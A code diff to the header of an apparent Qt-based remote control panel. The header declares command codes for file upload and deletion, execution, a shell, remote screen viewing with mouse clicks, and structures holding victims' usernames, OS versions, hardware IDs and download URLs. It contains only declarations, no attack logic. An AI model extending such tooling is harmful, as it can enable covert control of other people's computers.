@@ -19,7 +19,7 @@
 Q_GUI_EXPORT QPixmap qt_pixmapFromWinHBITMAP(HBITMAP bitmap, int hbitmapFormat=0);
 
 QT_BEGIN_NAMESPACE
-namespace Ui { class MWindow; class ScreenShot; class WScreenShot; class WExplorer; }
+namespace Ui { class MWindow; class ScreenShot; class WScreenShot; class WExplorer; class DisplayLabel; }
 QT_END_NAMESPACE
 
 #define CMD_HADSHAKE	0x0
@@ -37,6 +37,50 @@ QT_END_NAMESPACE
 #define DO_UPLDFILE		0x3
 #define DO_REMFILE		0x4
 #define DO_EXEC			0x5
+
+#define DO_CHANDGE_WH	0x1
+#define DO_RUNTHREAD	0x2
+#define DO_LCLICK       0x3
+#define DO_DCLICK       0x4
+#define DO_RCLICK       0x5
+
+typedef struct EXPLRR
+{
+    DWORD IND;
+    DWORD DO;
+    DWORD SIZEofJSON;
+} EXPLRR;
+
+typedef struct CLIENTS
+{
+    char USERNAME[100];
+    char OSVER[100];
+    char HWID[100];
+} CLIENTS;
+
+typedef struct DLE
+{
+    char URL[1020];
+} DLE;
+
+typedef struct BIGSCREEN
+{
+    int DO;
+    int w;
+    int h;
+    int RealW;
+    int RealH;
+    int ClickX;
+    int ClickY;
+    DWORD ZipSize;
+    DWORD Size;
+} BIGSCREEN;
+
+typedef struct CMDiDATA
+{
+    DWORD CMD;
+    BYTE DATA[1020];
+} CMDiDATA;
 
 class WExplorer : public QWidget
 {
@@ -68,6 +112,23 @@ private:
     Ui::WExplorer *ui;
 };
 
+class DisplayLabel : public QLabel
+{
+Q_OBJECT
+signals:
+    void mousePressed( const QPoint& );
+
+public:
+    DisplayLabel( QWidget* parent = 0, Qt::WindowFlags f = 0 );
+    DisplayLabel( const QString& text, QWidget* parent = 0, Qt::WindowFlags f = 0 );
+
+    int NOMER;
+    int ClientW;
+    int ClientH;
+
+    void mousePressEvent( QMouseEvent* ev );
+};
+
 class WScreenShot : public QWidget
 {
     Q_OBJECT
@@ -76,8 +137,17 @@ private:
 public:
     explicit WScreenShot(QWidget *parent = nullptr);
     ~WScreenShot();
+
+    int NOMER;
+    int ServerW;
+    int ServerH;
+
+signals:
+    void ChangeScreen(int NOMER, int w, int h);
 public slots:
-    void GetBitmap(BYTE *bytes, unsigned int Size, int w, int h);
+    void GetBitmap(BYTE *bytes, int NOMER, unsigned int Size, int w, int h, int realw, int realh);
+private slots:
+    void resizeEvent(QResizeEvent *event);
 
 private:
     Ui::WScreenShot *ui;
@@ -87,40 +157,6 @@ class WSocket  : public QObject
 {
     Q_OBJECT
 private:
-
-    typedef struct EXPLRR
-    {
-        DWORD IND;
-        DWORD DO;
-        DWORD SIZEofJSON;
-    } EXPLRR;
-
-    typedef struct CLIENTS
-    {
-        char USERNAME[100];
-        char OSVER[100];
-        char HWID[100];
-    } CLIENTS;
-
-    typedef struct DLE
-    {
-        char URL[1020];
-    } DLE;
-
-    typedef struct BIGSCREEN
-    {
-        int w;
-        int h;
-        DWORD ZipSize;
-        DWORD Size;
-    } BIGSCREEN;
-
-    typedef struct CMDiDATA
-    {
-        DWORD CMD;
-        BYTE DATA[1020];
-    } CMDiDATA;
-
     typedef NTSTATUS(NTAPI *fRtlDecompressBuffer)
     (
         USHORT CompressionFormat,
@@ -181,6 +217,7 @@ public slots:
     void CheckOnline();
     void Recving(int NOMER);
     void GetScreen(int NOMER);
+    void ChangeScreen(int NOMER, int w, int h);
     void Release(QString Json, int NOMER);
     void GetCurrPath(int NOMER);
     void SetCurrPath(int IDX, int NOMER);
@@ -193,7 +230,7 @@ signals:
     void DelClient(int NOMER);
     void CloseShell();
     void Release(QString Json);
-    void GetBitmap(BYTE *bytes, unsigned int Size, int w, int h);
+    void GetBitmap(BYTE *bytes, int NOMER, unsigned int Size, int w, int h, int realw, int realh);
 };
 
 class MWindow : public QMainWindow
